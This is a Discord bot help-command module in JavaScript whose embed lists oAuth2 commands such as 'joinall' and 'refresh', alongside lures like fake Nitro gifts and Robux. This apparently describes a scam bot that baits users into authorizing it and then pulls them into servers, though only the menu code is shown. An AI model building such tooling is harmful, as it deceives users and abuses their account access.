const discord = require("discord.js");

module.exports = {
  name: "yardým",
  description: "Bot komutlarýný gösterir",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
    
    const embed = new discord.EmbedBuilder()
    .setTitle(` `)
.setDescription(`> <:persono:1033812226747940985> **oAuth2 Menu**\n\`clean, refresh, joinall, join, users, leave, wl [add/remove/list]\`\n\n> <:bulbo:1033812230275350608> **Extra Cmds Menu**\n\`nitroboost, nitroclassic, giveaway, links, nitrogift, nsfw, ping, robux, bloxfruit, backup\`\n\n**Default Prefix:** \`/\`\n**After there authorized it brings them to the verified discord page!**`)
    .setColor(`#2F3136`)
      .setFooter({ text: ` `})
    await interaction.reply({embeds: [embed]})
  }
}